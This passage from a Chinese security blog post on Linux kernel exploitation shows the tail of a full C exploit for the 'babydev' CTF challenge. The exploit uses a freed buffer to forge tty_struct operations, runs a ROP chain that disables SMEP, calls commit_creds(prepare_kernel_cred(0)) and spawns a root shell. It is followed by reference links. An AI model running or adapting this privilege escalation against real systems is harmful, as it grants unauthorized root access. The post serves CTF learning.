ebx;ret，做栈迁移用</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX 0xFFFFFFFF8181BFC5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX 0xffffffff8100ce6e</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//函数指针</span></span><br><span class="line">   <span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))COMMIT_CREDS;</span><br><span class="line">   <span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Rooted!!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Root Fail!!\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*保存用户态的寄存器到变量里*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveUserState</span><span class="params">()</span> &#123;</span><br><span class="line">   __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">           <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">           <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">           );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;user states have been saved!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//保存用户态寄存器</span></span><br><span class="line">   saveUserState();</span><br><span class="line">   <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//申请一个tty_struct大小的堆</span></span><br><span class="line">   ioctl(fd1,<span class="number">0x10001</span>,TTY_STRUCT_SIZE);</span><br><span class="line">   <span class="comment">//释放这个堆</span></span><br><span class="line">   close(fd1);</span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> fake_tty_operations[<span class="number">35</span>];</span><br><span class="line">   <span class="comment">/*for (int i=0;i&lt;35;i++) &#123;</span></span><br><span class="line"><span class="comment">      fake_tty_operations[i] = 0xffffffffc0000000 + i;</span></span><br><span class="line"><span class="comment">   &#125;*/</span></span><br><span class="line">   <span class="comment">//这个位置是write函数的指针，经过调试，我们发现当调用这个函数时，rax正好是fake_tty_operation的地址，于是，我们把栈转移到</span></span><br><span class="line">   <span class="comment">//fake_tty_operations里</span></span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = MOV_RSP_RAX;</span><br><span class="line">   <span class="comment">//栈转移到fake_tty_operations里后，我们继续做一次转移，把转转移到我们的rop数组里，执行ROP</span></span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = POP_RAX;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = MOV_RSP_RAX;</span><br><span class="line"> </span><br><span class="line">   <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>];</span><br><span class="line">   <span class="comment">//这个操作会申请tty_struct的空间，也就是会申请到我们之前释放的那个堆里，我们可以用fd2来对它操作</span></span><br><span class="line">   <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="comment">//我们先把原始的tty_struct前面的数据读出来，存储</span></span><br><span class="line">   read(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="comment">//修改const struct tty_operations *ops;指针，指向我们伪造的tty_operations</span></span><br><span class="line">   fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;</span><br><span class="line">   <span class="comment">//把篡改过的tty_struct写回去</span></span><br><span class="line">   write(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">   write(fd_tty,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="参考文章">参考文章</h3>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/175110.html">Kernel pwn 基础教程之 ret2usr 与 bypass_smep - SecPulse.COM | 安全脉搏</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/98937960">(47条消息) Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep_钞sir的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104577501">(47条消息) linux kernel pwn学习之伪造tty_struct执行任意函数_ha1vk的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/98520140?spm=1001.2014.3001.5502">(47条消息) Linux Kernel Exploit 内核漏洞学习(2)-ROP_钞sir的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://ama2in9.top/2020/09/03/kernel/">Kernel Pwn从入门到放弃 | Ama2in9</a></p>
<p><a target="_blank" rel="noopener" href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">2018强网杯 core | X3h1n</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zikh26.github.io">ZIKH26</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zikh26.github.io/posts/a31a5755.html">https://zikh26.github.io/posts/a31a5755.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zikh26.github.io" target="_blank">ZIKH26's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kernel-ROP/">kernel-ROP</a><a class="post-meta__tags" href="/tags/kernel/">kernel</a></div><div class="post_share"><div class="social-share" data-image="/img/14.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/b0250b87.html"><img class="prev-cover" src="/img/3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">强网拟态线下游记</div></div></a></div><div class="next-post pull-right"><a href="/posts/8179f351.html"><img class="next-cover" src="/img/2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">关于popal指令的一道pwn</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/6176bce9.html" title="关于 kernel-Double Fetch 的学习总结"><img class="cover" src="/img/32.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-23</div><div class="title">关于 kernel-Double Fetch 的学习总结</div></div></a></div><div><a href="/posts/406ce0e2.html" title="关于 kernel-UAF 的学习总结"><img class="cover" src="/img/17.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-23</div><div class="title">关于 kernel-UAF 的学习总结</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZIKH26</div><div class="author-info__description">万古凡间一过客，九天之上第一仙</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">98</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZIKH26"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ZIKH26" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2777256035@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#kernel-ROP"><span class="toc-number">1.</span> <span class="toc-text">kernel-ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-canary"><span class="toc-number">1.2.1.</span> <span class="toc-text">泄露 canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.2.</span> <span class="toc-text">获取函数的真实地址</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96vmlinux%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E5%81%8F%E7%A7%BB"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">获取vmlinux中的函数偏移</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-gadget"><span class="toc-number">1.2.3.</span> <span class="toc-text">获取 gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP-%E9%93%BE%E7%9A%84%E5%B8%83%E7%BD%AE"><span class="toc-number">1.2.4.</span> <span class="toc-text">ROP 链的布置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2user"><span class="toc-number">2.</span> <span class="toc-text">ret2user</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-v2"><span class="toc-number">2.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-SMEP"><span class="toc-number">3.</span> <span class="toc-text">bypass-SMEP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-v3"><span class="toc-number">3.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.4.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/82a683c0.html" title="关于侧信道爆破的学习总结"><img src="/img/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于侧信道爆破的学习总结"/></a><div class="content"><a class="title" href="/posts/82a683c0.html" title="关于侧信道爆破的学习总结">关于侧信道爆破的学习总结</a><time datetime="2023-05-23T09:22:04.472Z" title="发表于 2023-05-23 17:22:04">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e734c492.html" title="关于SROP的学习总结"><img src="/img/25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于SROP的学习总结"/></a><div class="content"><a class="title" href="/posts/e734c492.html" title="关于SROP的学习总结">关于SROP的学习总结</a><time datetime="2023-05-23T09:22:04.472Z" title="发表于 2023-05-23 17:22:04">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/536aee5b.html" title="关于学习arm架构下的pwn的总结"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于学习arm架构下的pwn的总结"/></a><div class="content"><a class="title" href="/posts/536aee5b.html" title="关于学习arm架构下的pwn的总结">关于学习arm架构下的pwn的总结</a><time datetime="2023-05-23T09:22:04.472Z" title="发表于 2023-05-23 17:22:04">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ba418f23.html" title="关于ret2_dl_runtime_resolve的学习总结"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于ret2_dl_runtime_resolve的学习总结"/></a><div class="content"><a class="title" href="/posts/ba418f23.html" title="关于ret2_dl_runtime_resolve的学习总结">关于ret2_dl_runtime_resolve的学习总结</a><time datetime="2023-05-23T09:22:04.472Z" title="发表于 2023-05-23 17:22:04">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4202235.html" title="关于ret2csu的学习总结"><img src="/img/nvhai3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于ret2csu的学习总结"/></a><div class="content"><a class="title" href="/posts/4202235.html" title="关于ret2csu的学习总结">关于ret2csu的学习总结</a><time datetime="2023-05-23T09:22:04.472Z" title="发表于 2023-05-23 17:22:04">2023-05-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/14.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ZIKH26</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi，欢迎来<a href="https://zikh26.github.io/">我的博客</a>!!!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'GEgJnxmVMmtk5TO9ntcgogeL-gzGzoHsz',
      appKey: 'FJXLkmbCYXC6IqkCRKgQzTJf',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: true
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/sun_moon.js" async></script><link rel="stylesheet" href="/css/font.css"><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>